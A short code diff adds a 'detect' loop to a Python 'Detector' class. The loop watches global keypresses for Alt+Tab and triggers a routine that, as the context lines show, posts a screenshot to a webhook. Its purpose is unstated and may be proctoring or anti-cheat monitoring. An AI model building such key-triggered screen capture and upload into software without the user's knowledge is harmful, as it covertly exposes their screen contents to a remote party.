@@ -19,4 +19,9 @@ class Detector():
         embed.set_image(url="attachment://ss.png")
         webhook.add_embed(embed)
         webhook.execute()
-        
+
+    def detect(self):
+        while True:
+            if(keyboard.is_pressed('alt')):
+                if(keyboard.is_pressed('tab')):
+                    self.is_detected()
